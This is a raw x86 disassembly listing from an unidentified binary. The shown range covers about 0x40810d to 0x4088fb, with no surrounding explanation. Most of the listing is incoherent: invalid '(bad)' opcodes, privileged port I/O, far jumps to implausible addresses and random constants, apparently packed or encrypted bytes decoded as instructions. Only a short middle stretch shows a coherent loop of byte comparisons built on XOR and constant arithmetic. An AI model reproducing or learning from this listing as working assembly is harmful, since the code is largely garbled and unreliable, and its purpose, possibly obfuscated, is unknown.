  40810d:	mov    bl,0xf1
  40810f:	jo     0x40818c
  408111:	out    0xc3,al
  408113:	and    DWORD PTR ds:0xaf1bfe2d,esi
  408119:	inc    edi
  40811a:	mov    eax,0x6b5cc6f1
  40811f:	push   ss
  408120:	jno    0x408177
  408122:	retf   
  408123:	sar    BYTE PTR [ebx+0x7a],cl
  408126:	mov    ebp,0xf46f0f7e
  40812b:	loope  0x40813e
  40812d:	nop
  40812e:	arpl   WORD PTR [esi-0x6d],si
  408131:	fdivrp st(1),st
  408133:	jge    0x4080eb
  408135:	cmp    eax,0x86bdc3c2
  40813a:	dec    esp
  40813b:	sti    
  40813c:	cmp    DWORD PTR [edi+0x2da17bd9],eax
  408142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408143:	or     esi,eax
  408145:	add    ah,BYTE PTR [ebp+0x2b8e94a5]
  40814b:	sub    bl,dh
  40814d:	inc    ebx
  40814e:	pushf  
  40814f:	push   edi
  408150:	fdivr  st,st(1)
  408152:	dec    ecx
  408153:	sbb    eax,0xd898dc69
  408158:	dec    ecx
  408159:	add    dh,dh
  40815b:	cdq    
  40815c:	shl    DWORD PTR [edx-0x60],1
  40815f:	jne    0x4081ce
  408161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408162:	(bad)  
  408163:	adc    DWORD PTR [ecx],ebp
  408165:	jbe    0x4081ab
  408167:	data16 xor ah,BYTE PTR [ecx]
  40816a:	outs   dx,DWORD PTR ds:[esi]
  40816b:	mov    esi,0xc81df5e0
  408170:	and    BYTE PTR [edx+0x4cdf95fd],al
  408176:	(bad)  
  408177:	sbb    DWORD PTR [ebx-0x760bf1b5],ecx
  40817d:	sbb    BYTE PTR ds:0x7cf6e946,al
  408183:	and    eax,0x2d277e37
  408188:	stos   BYTE PTR es:[edi],al
  408189:	test   al,0x92
  40818b:	mov    eax,0x8201f419
  408190:	mov    ds:0x844b51f9,eax
  408195:	mov    ds:0x4a946f14,eax
  40819a:	push   ebx
  40819b:	add    eax,0x8a642261
  4081a0:	mov    al,ds:0xc334dae
  4081a5:	adc    DWORD PTR [esi+0x6c],0x10
  4081a9:	xchg   edx,eax
  4081aa:	jne    0x4081bd
  4081ac:	jle    0x40814b
  4081ae:	in     al,dx
  4081af:	retf   
  4081b0:	mov    ?,WORD PTR [esi-0xb]
  4081b3:	xor    cl,BYTE PTR [ebp-0x8021081]
  4081b9:	stos   BYTE PTR es:[edi],al
  4081ba:	icebp  
  4081bb:	(bad)  
  4081bc:	in     al,dx
  4081bd:	fwait
  4081be:	add    bl,BYTE PTR [ebx+0x7d]
  4081c1:	jbe    0x408186
  4081c3:	(bad)  
  4081c4:	leave  
  4081c5:	ret    
  4081c6:	mov    eax,ds:0xc791c16
  4081cb:	pop    ds
  4081cc:	jo     0x4081b7
  4081ce:	bound  esi,QWORD PTR [edx]
  4081d0:	pushf  
  4081d1:	jmp    0x408237
  4081d3:	loope  0x40821f
  4081d5:	idiv   BYTE PTR [edi+0x61]
  4081d8:	lods   eax,DWORD PTR ds:[esi]
  4081d9:	xor    eax,0xe5962c18
  4081de:	pop    edi
  4081df:	inc    ebp
  4081e0:	dec    eax
  4081e1:	imul   ebx,DWORD PTR [esi+0x645f40ab],0x2c
  4081e8:	push   eax
  4081e9:	sub    DWORD PTR [edx-0x72],eax
  4081ec:	add    eax,0x2efe1110
  4081f1:	aas    
  4081f2:	dec    edx
  4081f3:	fisttp QWORD PTR [esi+ebx*4-0x335b287a]
  4081fa:	cwde   
  4081fb:	pusha  
  4081fc:	adc    ch,BYTE PTR [edx]
  4081fe:	xchg   esp,eax
  4081ff:	adc    BYTE PTR [eax],bh
  408201:	aaa    
  408202:	xchg   DWORD PTR [edi+0x41],esp
  408205:	add    DWORD PTR [ecx+0x66014fe1],edx
  40820b:	xor    al,0x6a
  40820d:	pop    ebx
  40820e:	das    
  40820f:	or     BYTE PTR [esi+0x676ad49b],ah
  408215:	mov    cl,0x47
  408217:	mov    edx,0x2f21e915
  40821c:	neg    DWORD PTR [ebp-0x3dddab5]
  408222:	into   
  408223:	mov    bh,0xc6
  408225:	int    0x9f
  408227:	adc    bh,BYTE PTR [ebx]
  408229:	mov    ch,0x46
  40822b:	pop    ecx
  40822c:	jg     0x4081d4
  40822e:	repnz gs mov ch,0x33
  408232:	inc    ebx
  408233:	sub    BYTE PTR [edi-0x39],0xfe
  408237:	sub    BYTE PTR [esi-0x5b],dl
  40823a:	shr    BYTE PTR ds:0x74ce0d9e,0xc2
  408241:	cwde   
  408242:	mov    ds:0xa67298de,eax
  408247:	xchg   ebx,eax
  408248:	addr16 push 0x7a10e580
  40824e:	pop    esp
  40824f:	js     0x40822c
  408251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408252:	cs jmp 0xea4e:0x1e92af7e
  40825a:	sub    DWORD PTR [ebx],edi
  40825c:	xchg   BYTE PTR [ecx],bl
  40825e:	rcl    DWORD PTR [eax],1
  408260:	mov    esp,0xbb65d24c
  408265:	enter  0x53a5,0x99
  408269:	ja     0x40829a
  40826b:	mov    esi,0x3a36874
  408270:	in     al,dx
  408271:	addr16 mov ?,ecx
  408274:	jmp    0x602ace2a
  408279:	mov    esp,DWORD PTR [eax+edx*1+0x41]
  40827d:	or     dl,0xc2
  408280:	and    al,0xd6
  408282:	sub    DWORD PTR [edi],eax
  408284:	sbb    edx,DWORD PTR [edx+edx*4+0x148cae5b]
  40828b:	xchg   edx,eax
  40828c:	addr16 (bad) 
  40828e:	mov    dh,0xe7
  408290:	mov    ebx,0x7dc8cfc7
  408295:	fcom   QWORD PTR [ecx-0x42]
  408298:	mov    eax,0x9a719b53
  40829d:	stc    
  40829e:	inc    ebp
  40829f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082a0:	sbb    DWORD PTR [edi-0x1],edx
  4082a3:	mov    ebp,0x2e890d44
  4082a8:	jge    0x4082b8
  4082aa:	mov    al,ds:0x83a4ae4e
  4082af:	and    al,0x2e
  4082b1:	adc    al,0x68
  4082b3:	dec    esi
  4082b4:	fsub   QWORD PTR [edx-0x3189e982]
  4082ba:	or     al,0xaf
  4082bc:	stos   DWORD PTR es:[edi],eax
  4082bd:	retf   
  4082be:	cld    
  4082bf:	push   es
  4082c0:	xchg   ecx,eax
  4082c1:	jle    0x408277
  4082c3:	dec    ebx
  4082c4:	sub    eax,0x6702d99c
  4082c9:	push   0xffffffa7
  4082cb:	lock pop ss
  4082cd:	xor    al,0x8a
  4082cf:	test   DWORD PTR [eax],edi
  4082d1:	shl    BYTE PTR [edi],0x19
  4082d4:	push   ebp
  4082d5:	pop    esi
  4082d6:	inc    edi
  4082d7:	mov    esp,0x5855debc
  4082dc:	pop    ebx
  4082dd:	xor    ecx,DWORD PTR [edx-0x7d]
  4082e0:	mov    cl,BYTE PTR [esi+0x617d21cd]
  4082e6:	pop    ds
  4082e7:	jle    0x4082a1
  4082e9:	sti    
  4082ea:	jmp    0x78bec51e
  4082ef:	jp     0x4082aa
  4082f1:	sbb    al,bh
  4082f3:	lods   al,BYTE PTR ds:[esi]
  4082f4:	sbb    dl,BYTE PTR [ecx-0x28315fae]
  4082fa:	fmulp  st(1),st
  4082fc:	aad    0x87
  4082fe:	call   0x7a6d25a
  408303:	jns    0x408320
  408305:	inc    ebx
  408306:	inc    edx
  408307:	loopne 0x408353
  408309:	mov    DWORD PTR [edi*4-0x3642dc70],0x82ff61b4
  408314:	pusha  
  408315:	nop    DWORD PTR [ebx+0xb465ce9]
  40831c:	retf   0xc7b8
  40831f:	fucomi st,st(6)
  408321:	mov    ds:0x8d252518,eax
  408326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408327:	stos   DWORD PTR es:[edi],eax
  408328:	inc    edi
  408329:	or     eax,0x9df37c72
  40832e:	aam    0x35
  408330:	or     bh,BYTE PTR [esi+0x62cefda8]
  408336:	xchg   ecx,eax
  408337:	and    esp,DWORD PTR ds:0x2d99471
  40833d:	fucomip st,st(0)
  40833f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408340:	inc    esp
  408341:	mov    eax,ds:0x86007201
  408346:	mov    ah,0xb1
  408348:	sbb    al,0x74
  40834a:	test   eax,0x2b9d8fe1
  40834f:	and    dh,BYTE PTR [esi]
  408351:	mov    bh,0x36
  408353:	(bad)  
  408354:	xchg   edi,eax
  408355:	jo     0x408320
  408357:	fdivr  DWORD PTR [ecx]
  408359:	push   edx
  40835a:	ja     0x408393
  40835c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40835d:	sub    eax,0x45fc7262
  408362:	xor    BYTE PTR [edi],dh
  408364:	push   ebp
  408365:	push   cs
  408366:	clc    
  408367:	in     al,0x9c
  408369:	cmp    dl,bh
  40836b:	xchg   ebx,eax
  40836c:	sbb    al,0x6c
  40836e:	add    BYTE PTR [edx+0x143ca16],0xe
  408375:	add    cl,BYTE PTR [ecx+0x70]
  408378:	sub    al,0x9
  40837a:	mov    BYTE PTR [edi-0x2fc548a9],ah
  408380:	mov    dl,BYTE PTR [ebp-0x26b62cb8]
  408386:	cdq    
  408387:	mov    ds:0xe4b2861f,al
  40838c:	mov    gs,WORD PTR ds:0x3d815000
  408392:	xlat   BYTE PTR ds:[ebx]
  408393:	std    
  408394:	sti    
  408395:	cmp    DWORD PTR [eax-0x20],0x4634391f
  40839c:	lock fadd QWORD PTR [esi-0x2b409906]
  4083a3:	hlt    
  4083a4:	in     al,0xdd
  4083a6:	dec    eax
  4083a7:	ins    BYTE PTR es:[edi],dx
  4083a8:	imul   edi,DWORD PTR [esi+0x263a5235],0x53695e83
  4083b2:	sbb    ch,BYTE PTR [edi]
  4083b4:	or     bh,BYTE PTR [edx-0x5b28e308]
  4083ba:	adc    DWORD PTR [edi-0x72ea37ed],ebx
  4083c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083c1:	or     al,0x7d
  4083c3:	push   es
  4083c4:	pop    esp
  4083c5:	adc    al,0xf7
  4083c7:	scas   eax,DWORD PTR es:[edi]
  4083c8:	js     0x40838a
  4083ca:	dec    ebx
  4083cb:	mov    ch,0xd7
  4083cd:	data16 cmp BYTE PTR [eax],0xcb
  4083d1:	ins    BYTE PTR es:[edi],dx
  4083d2:	outs   dx,DWORD PTR ds:[esi]
  4083d3:	push   cs
  4083d4:	dec    esp
  4083d5:	(bad)  
  4083d6:	sahf   
  4083d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083d8:	dec    ebp
  4083d9:	dec    eax
  4083da:	je     0x408456
  4083dc:	test   ah,ah
  4083de:	mov    ebp,0x805daf80
  4083e3:	je     0x40843e
  4083e5:	popa   
  4083e6:	push   es
  4083e7:	(bad)  
  4083e8:	rcl    BYTE PTR [edx-0x6c],1
  4083eb:	cmp    DWORD PTR ds:0xa805448a,ebp
  4083f1:	mov    dl,BYTE PTR [ebp-0x1]
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi+0x17245325],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x408449
  408448:	ja     0x40842b
  40844a:	je     0x4084ca
  40844c:	nop
  40844d:	jmp    0xc400:0xc5f28424
  408454:	lea    eax,[edi+ebp*4]
  408457:	adc    al,0xa6
  408459:	loop   0x4084bf
  40845b:	xor    esi,DWORD PTR [ebx+edi*4-0x11]
  40845f:	addr16 retf 0xf71d
  408463:	outs   dx,BYTE PTR ds:[si]
  408465:	int3   
  408466:	sub    BYTE PTR ds:0x39035320,cl
  40846c:	int3   
  40846d:	mov    esi,fs
  40846f:	jge    0x408468
  408471:	enter  0x721c,0xb
  408475:	or     DWORD PTR [ebp-0x20],esi
  408478:	lds    edx,FWORD PTR [edx]
  40847a:	inc    eax
  40847b:	rcl    DWORD PTR [ecx],cl
  40847d:	mov    dl,0xed
  40847f:	shl    DWORD PTR [esi],cl
  408481:	push   es
  408482:	lock xor DWORD PTR fs:[ebx],esi
  408486:	out    0x22,eax
  408488:	xor    esi,ecx
  40848a:	ror    DWORD PTR ds:0xc281191d,cl
  408490:	inc    edx
  408491:	cli    
  408492:	es add eax,0x8f75ce48
  408498:	xor    ch,BYTE PTR [edi]
  40849a:	scas   eax,DWORD PTR es:[edi]
  40849b:	sbb    eax,0x94765d4d
  4084a0:	sub    BYTE PTR [ebp+0x1e07085b],bh
  4084a6:	or     al,al
  4084a8:	fsub   st(6),st
  4084aa:	and    DWORD PTR [ebp+0x7a],ecx
  4084ad:	pop    esi
  4084ae:	jno    0x408474
  4084b0:	push   0x11
  4084b2:	popf   
  4084b3:	pop    edi
  4084b4:	sahf   
  4084b5:	out    dx,eax
  4084b6:	in     al,0x80
  4084b8:	ins    BYTE PTR es:[edi],dx
  4084b9:	cli    
  4084ba:	pop    esp
  4084bb:	sub    bh,bh
  4084bd:	inc    eax
  4084be:	pop    es
  4084bf:	dec    esi
  4084c0:	sub    DWORD PTR [eax+edx*8],eax
  4084c3:	adc    DWORD PTR [edi-0x76],edi
  4084c6:	sahf   
  4084c7:	push   ebx
  4084c8:	or     edx,ebp
  4084ca:	mov    bl,0x5
  4084cc:	stos   DWORD PTR es:[edi],eax
  4084cd:	shl    DWORD PTR [eax],cl
  4084cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084d0:	add    bl,BYTE PTR [edi-0x15]
  4084d3:	pop    edi
  4084d4:	sub    DWORD PTR [edx+0x4700548d],esi
  4084da:	pop    eax
  4084db:	pop    esi
  4084dc:	loopne 0x408472
  4084de:	mov    DWORD PTR [ecx],0x9fac88c2
  4084e4:	iret   
  4084e5:	aad    0xfd
  4084e7:	pushf  
  4084e8:	and    al,0x87
  4084ea:	in     al,dx
  4084eb:	in     eax,dx
  4084ec:	rol    BYTE PTR [ebp+0x7c2b682d],1
  4084f2:	adc    dl,al
  4084f4:	jecxz  0x408482
  4084f6:	cdq    
  4084f7:	enter  0x30bf,0x15
  4084fb:	in     eax,dx
  4084fc:	cmp    al,BYTE PTR ds:0x8d9b6b2e
  408502:	rcr    BYTE PTR [edi],cl
  408504:	jno    0x40852c
  408506:	sbb    ecx,DWORD PTR [edx+edx*8+0x8080925]
  40850d:	fadd   st,st(6)
  40850f:	jnp    0x4084fc
  408511:	cmc    
  408512:	pop    dx
  408514:	mov    edx,0xeae25f19
  408519:	jne    0x408535
  40851b:	push   esp
  40851c:	jl     0x408574
  40851e:	pop    ds
  40851f:	popa   
  408520:	aad    0x52
  408522:	clc    
  408523:	add    edi,edi
  408525:	jmp    0xc30ff55c
  40852a:	jmp    0xd130bade
  40852f:	mov    WORD PTR [esi+0xba3218],?
  408535:	jp     0x408584
  408537:	pop    es
  408538:	and    DWORD PTR ds:0x7cda5558,0x6e
  40853f:	dec    esp
  408540:	push   edi
  408541:	dec    eax
  408542:	add    ebp,DWORD PTR es:[edi+0x53205d97]
  408549:	(bad)  
  40854a:	shl    BYTE PTR [eax],1
  40854c:	xchg   BYTE PTR [ebp+0x3d510350],cl
  408552:	dec    esi
  408553:	add    eax,0xc5c0efb
  408558:	cmp    bh,cl
  40855a:	into   
  40855b:	sbb    BYTE PTR [edi-0x3],cl
  40855e:	dec    eax
  40855f:	lea    esi,es:[eax+0x40c6b8a9]
  408566:	repnz push esi
  408568:	clc    
  408569:	loop   0x40854f
  40856b:	loopne 0x4084fd
  40856d:	jge    0x408594
  40856f:	(bad)  
  408571:	rcr    BYTE PTR [edx],1
  408573:	enter  0xabb3,0x87
  408577:	xchg   ebp,eax
  408578:	xlat   BYTE PTR ds:[ebx]
  408579:	fs test dh,dh
  40857c:	shl    BYTE PTR [edi+0x5c],cl
  40857f:	dec    edx
  408580:	setl   BYTE PTR [eax]
  408583:	xchg   esp,eax
  408584:	in     al,0x6e
  408586:	xor    ebp,DWORD PTR [ecx+0x7234ed39]
  40858c:	icebp  
  40858d:	jge    0x408574
  40858f:	mov    al,0x2c
  408591:	sub    BYTE PTR [eax],0x12
  408594:	int3   
  408595:	cld    
  408596:	xlat   BYTE PTR ds:[ebx]
  408597:	fld    QWORD PTR [edx-0x50bfbb94]
  40859d:	cmp    DWORD PTR [eax-0x43f0bd28],eax
  4085a3:	push   esi
  4085a4:	cdq    
  4085a5:	inc    ebp
  4085a6:	inc    esp
  4085a7:	das    
  4085a8:	pop    ebp
  4085a9:	or     al,0xd9
  4085ab:	or     ah,BYTE PTR [edi-0xc]
  4085ae:	xchg   esi,eax
  4085af:	ror    DWORD PTR [edi-0x30],0x81
  4085b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085b4:	aaa    
  4085b5:	cwde   
  4085b6:	int    0x1e
  4085b8:	adc    BYTE PTR [eax+0x1b5d6995],dl
  4085be:	sahf   
  4085bf:	fdivr  DWORD PTR [ebx+0x6a]
  4085c2:	stos   DWORD PTR es:[edi],eax
  4085c3:	fs cmp eax,0x34d035b2
  4085c9:	aad    0x1d
  4085cb:	mov    ebx,0x6f89ab1d
  4085d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085d1:	cmp    DWORD PTR [edx],eax
  4085d3:	add    BYTE PTR ds:0xfd30f862,ch
  4085d9:	xor    al,0x91
  4085db:	jmp    0x44cff1df
  4085e0:	mov    cl,0x80
  4085e2:	hlt    
  4085e3:	dec    ebx
  4085e4:	sub    esi,DWORD PTR [ebx-0x76c07a21]
  4085ea:	cs pop es
  4085ec:	dec    ecx
  4085ed:	nop
  4085ee:	jo     0x4085c6
  4085f0:	jmp    0x5d16fd94
  4085f5:	push   esp
  4085f6:	push   ebp
  4085f7:	push   edi
  4085f8:	aas    
  4085f9:	fisub  WORD PTR [edx+edx*8]
  4085fc:	or     dh,ch
  4085fe:	aad    0xb6
  408600:	jmp    0x5d71a480
  408605:	sti    
  408606:	enter  0x117a,0x5e
  40860a:	bound  esi,QWORD PTR [eax-0x396b311]
  408610:	cvtps2pi mm4,xmm7
  408613:	xor    al,0x5a
  408615:	pushf  
  408616:	sahf   
  408617:	lea    ebx,[eax+0x3e]
  40861a:	mov    ecx,0x437268c8
  40861f:	arpl   WORD PTR [eax+esi*8],si
  408622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408623:	and    dl,BYTE PTR [edx+edi*2+0x1a]
  408627:	pop    edi
  408628:	aaa    
  408629:	(bad)  
  40862b:	dec    ebp
  40862c:	xchg   edi,eax
  40862d:	fs cli 
  40862f:	in     eax,dx
  408630:	lock and edx,DWORD PTR [edi+0xb154ee3]
  408637:	sub    al,0xce
  408639:	xchg   edi,ecx
  40863b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40863c:	jmp    0x17ffdbcb
  408641:	ins    DWORD PTR es:[edi],dx
  408642:	hlt    
  408643:	(bad)  
  408644:	(bad)  [esi-0xfd5ea04]
  40864a:	dec    ebp
  40864b:	xor    DWORD PTR [ecx+0x2957c71a],ecx
  408651:	or     BYTE PTR [ebx-0x1d],0xb6
  408655:	sbb    BYTE PTR [esi-0x69],bh
  408658:	scas   al,BYTE PTR es:[edi]
  408659:	inc    eax
  40865a:	lods   al,BYTE PTR ds:[esi]
  40865b:	outs   dx,BYTE PTR ds:[esi]
  40865c:	dec    esi
  40865d:	in     al,0xd
  40865f:	push   edi
  408660:	pushf  
  408661:	repnz mov bh,0xf8
  408664:	sub    al,0xd
  408666:	test   BYTE PTR [edx-0x145f0d7d],bl
  40866c:	push   ebx
  40866d:	sbb    esi,DWORD PTR [ebx-0x64339aaa]
  408673:	and    dl,BYTE PTR [esi+0x58]
  408676:	cld    
  408677:	cmp    edx,edi
  408679:	jns    0x40863b
  40867b:	mov    bl,0x83
  40867d:	repz jns 0x3419220b
  408684:	xor    esi,DWORD PTR [edx+esi*4]
  408687:	rcl    DWORD PTR [esi+0x4d756003],1
  40868d:	clc    
  40868e:	jb     0x408686
  408690:	dec    esi
  408691:	mov    esi,DWORD PTR [ebp-0x14]
  408694:	pop    ebp
  408695:	jnp    0x408666
  408697:	add    DWORD PTR [ebx+0xfadea06],0xedcbb9aa
  4086a1:	mov    ebp,0x5ca77b28
  4086a6:	or     DWORD PTR [edx-0x66],0x69
  4086aa:	xor    al,0xc8
  4086ac:	int3   
  4086ad:	fnsave [ecx]
  4086af:	mov    al,ds:0xf9645e5c
  4086b4:	int    0xf3
  4086b6:	sbb    esp,esi
  4086b8:	sti    
  4086b9:	pop    edx
  4086ba:	mov    al,0x99
  4086bc:	jbe    0x408702
  4086be:	out    0x47,al
  4086c0:	jns    0x4086c7
  4086c2:	add    BYTE PTR [ecx-0x68d8cd89],bh
  4086c8:	and    al,0x2c
  4086ca:	js     0x408660
  4086cc:	iret   
  4086cd:	mov    ebx,0x51d773e8
  4086d2:	xor    ch,al
  4086d4:	(bad)  
  4086d5:	or     cl,BYTE PTR ds:0x5154090a
  4086db:	pop    eax
  4086dc:	xor    bl,dl
  4086de:	jmp    0x4086e0
  4086e0:	and    ch,BYTE PTR [ebx+0x31ff9f29]
  4086e6:	je     0x408712
  4086e8:	ja     0x4086d5
  4086ea:	sub    DWORD PTR [ebp+0x29],ebp
  4086ed:	aam    0x22
  4086ef:	lds    ebp,FWORD PTR ds:0xa0804d24
  4086f5:	pop    edi
  4086f6:	cmp    al,0x11
  4086f8:	mov    al,ds:0x302aa3e2
  4086fd:	and    DWORD PTR [ebx-0x40],eax
  408700:	xchg   esi,eax
  408701:	call   0x43ab:0x1547fe84
  408708:	push   esi
  408709:	mov    BYTE PTR [edx+0xa],ah
  40870c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40870d:	dec    esi
  40870e:	fldcw  WORD PTR [ebx+ebp*4-0x55]
  408712:	xchg   DWORD PTR [ebp+0x38bb517e],edi
  408718:	mov    bl,0x1
  40871a:	adc    DWORD PTR [edi-0x39],ecx
  40871d:	mov    bh,0x8e
  40871f:	mov    ebx,0x11438331
  408724:	mov    esi,0x9520e2be
  408729:	call   esi
  40872b:	sbb    ecx,ebx
  40872d:	loopne 0x408768
  40872f:	sbb    esp,DWORD PTR [ebx+esi*4+0x1f]
  408733:	lea    eax,[ebp-0x18]
  408736:	mov    DWORD PTR [ebp-0x14],eax
  408739:	mov    eax,DWORD PTR [ebp-0x14]
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	in     eax,0x5d
  408779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40877a:	mov    eax,0x7878e7cc
  40877f:	fs jle 0x4087fa
  408782:	js     0x40870c
  408784:	sub    DWORD PTR [ebx+0x7e],esp
  408787:	jge    0x408724
  408789:	mov    ch,0x1e
  40878b:	fisub  WORD PTR [ebx-0x771ed2ac]
  408791:	ins    BYTE PTR es:[edi],dx
  408792:	cmp    ecx,edx
  408794:	xor    eax,0x5b54e0d2
  408799:	in     eax,0x9b
  40879b:	xchg   DWORD PTR [edi+eiz*4],ecx
  40879e:	out    dx,eax
  40879f:	jns    0x408761
  4087a1:	mov    ds:0x2cd8221f,eax
  4087a6:	inc    ecx
  4087a7:	inc    edx
  4087a8:	inc    edx
  4087a9:	pop    es
  4087aa:	mov    edx,0xdfd921c9
  4087af:	ret    0x542f
  4087b2:	jno    0x4087af
  4087b4:	xchg   edi,eax
  4087b5:	or     BYTE PTR [ecx],dl
  4087b7:	pop    edi
  4087b8:	mov    ch,0xde
  4087ba:	cs jnp 0x4087fc
  4087bd:	sahf   
  4087be:	test   DWORD PTR [eax],edx
  4087c0:	(bad)  
  4087c2:	xor    al,0xc5
  4087c4:	inc    esp
  4087c5:	js     0x40883f
  4087c7:	cmp    eax,0x110ab4e8
  4087cc:	add    dl,BYTE PTR [ebx-0x4f]
  4087cf:	bound  eax,QWORD PTR [ecx+0x2]
  4087d2:	sti    
  4087d3:	pop    edx
  4087d4:	mov    cl,0xa9
  4087d6:	inc    eax
  4087d7:	mov    dh,0x35
  4087d9:	jne    0x408821
  4087db:	and    dl,BYTE PTR [edx+0x7d27bb90]
  4087e1:	lock clc 
  4087e3:	mov    dh,0xa
  4087e5:	das    
  4087e6:	mov    al,ds:0x36d32d1e
  4087eb:	das    
  4087ec:	sub    DWORD PTR [edx-0x547d581d],esp
  4087f2:	xlat   BYTE PTR ds:[ebx]
  4087f3:	shl    DWORD PTR [edx+0x34],1
  4087f6:	dec    edi
  4087f7:	in     eax,dx
  4087f8:	fnclex 
  4087fa:	test   ah,ah
  4087fc:	xor    ch,BYTE PTR [ebx-0x4c523572]
  408802:	es cwde 
  408804:	shl    BYTE PTR ds:0x7c61ac5b,1
  40880a:	js     0x4087f9
  40880c:	ja     0x408849
  40880e:	xor    ch,BYTE PTR [ecx]
  408810:	sub    eax,0x635fc3d8
  408815:	inc    esi
  408816:	aam    0xed
  408818:	sti    
  408819:	ret    
  40881a:	add    al,ah
  40881c:	int    0x94
  40881e:	ss in  eax,dx
  408820:	sbb    ecx,DWORD PTR [ebx]
  408822:	stos   DWORD PTR es:[edi],eax
  408823:	mov    esi,0x77e87f6f
  408828:	sub    cl,bl
  40882a:	cdq    
  40882b:	je     0x40883e
  40882d:	inc    ecx
  40882e:	aas    
  40882f:	dec    ebx
  408830:	and    BYTE PTR [esi-0x18],dl
  408833:	jge    0x4087de
  408835:	jle    0x4087df
  408837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408838:	xchg   ebx,eax
  408839:	inc    esi
  40883a:	(bad)  
  40883b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40883c:	xor    al,0x8c
  40883e:	pop    ds
  40883f:	mov    edx,ebx
  408841:	cmp    DWORD PTR [ebx],ecx
  408843:	rol    DWORD PTR [ecx],1
  408845:	sahf   
  408846:	and    eax,0xfa8a3b93
  40884b:	pop    esi
  40884c:	fwait
  40884d:	test   DWORD PTR [edi],0xa8ec75a1
  408853:	in     eax,dx
  408854:	test   eax,0x6e1678dc
  408859:	iret   
  40885a:	call   FWORD PTR [eax-0x6]
  40885d:	inc    ecx
  40885e:	les    esp,FWORD PTR ds:0xb2f3272c
  408864:	sub    eax,0xfd13f731
  408869:	cmp    DWORD PTR [esi+0x33db7fdf],edx
  40886f:	out    dx,eax
  408870:	fadd   QWORD PTR [ebx+0x5]
  408873:	loope  0x408801
  408875:	inc    edi
  408876:	imul   ecx,DWORD PTR [edx+0x28],0xa28db224
  40887d:	(bad)  
  40887e:	into   
  40887f:	sub    DWORD PTR [ebx-0x28d866a3],0xe26b6c9
  408889:	push   ds
  40888a:	popa   
  40888b:	dec    eax
  40888c:	cdq    
  40888d:	mov    ?,WORD PTR [edx]
  40888f:	call   0x13f739dc
  408894:	mov    edi,0x8ccd5a40
  40889a:	pop    ecx
  40889b:	cmp    bh,0x1b
  40889e:	xchg   edx,eax
  40889f:	pop    edi
  4088a0:	inc    edx
  4088a1:	sub    eax,0xfb354894
  4088a6:	xor    dl,BYTE PTR [ebx+0x493c931f]
  4088ac:	frstor [edi+ebx*8+0x5c0d393c]
  4088b3:	xchg   esp,eax
  4088b4:	and    DWORD PTR [ebx+0x61],eax
  4088b7:	sbb    esi,edx
  4088b9:	push   es
  4088ba:	mov    ch,0x82
  4088bc:	add    eax,DWORD PTR [eax+ecx*8+0x5a]
  4088c0:	hlt    
  4088c1:	addr16 and eax,0x2fa6050c
  4088c7:	addr16 lahf 
  4088c9:	iret   
  4088ca:	(bad)
  4088ce:	jmp    0x408945
  4088d0:	inc    bh
  4088d2:	test   al,0xfb
  4088d4:	inc    edi
  4088d5:	or     BYTE PTR [esp+eiz*8],ch
  4088d8:	inc    ecx
  4088d9:	xchg   esi,eax
  4088da:	gs aam 0xe0
  4088dd:	stos   DWORD PTR es:[edi],eax
  4088de:	stos   DWORD PTR es:[edi],eax
  4088df:	es ins DWORD PTR es:[edi],dx
  4088e1:	dec    esp
  4088e2:	and    cl,BYTE PTR [edi-0x56]
  4088e5:	or     ebp,DWORD PTR [ebx]
  4088e7:	mov    bh,0x3f
  4088e9:	js     0x40886c
  4088eb:	and    bh,BYTE PTR [ebp-0x46]
  4088ee:	pop    esi
  4088ef:	push   0xbb2e152
  4088f4:	shl    DWORD PTR [esi+0x162ee2c3],cl
  4088fa:	dec    ecx
  4088fb:	enter  0x3ccf,0xcb
